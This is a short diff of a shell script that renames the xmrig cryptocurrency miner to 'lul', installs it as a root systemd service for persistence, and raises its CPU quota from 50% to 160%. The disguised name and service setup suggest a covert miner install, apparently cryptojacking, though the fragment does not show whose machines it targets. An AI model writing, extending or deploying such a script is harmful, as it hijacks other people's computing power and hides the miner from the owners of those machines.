@@ -11,7 +11,7 @@ mv xmrig lul
 echo "[Install]
 WantedBy=multi-user.target
 [Service]
-CPUQuota=50%
+CPUQuota=160%
 ExecStart=/root/lul/build/lul" > /etc/systemd/system/lul.service
 echo "{
   \"api\": {
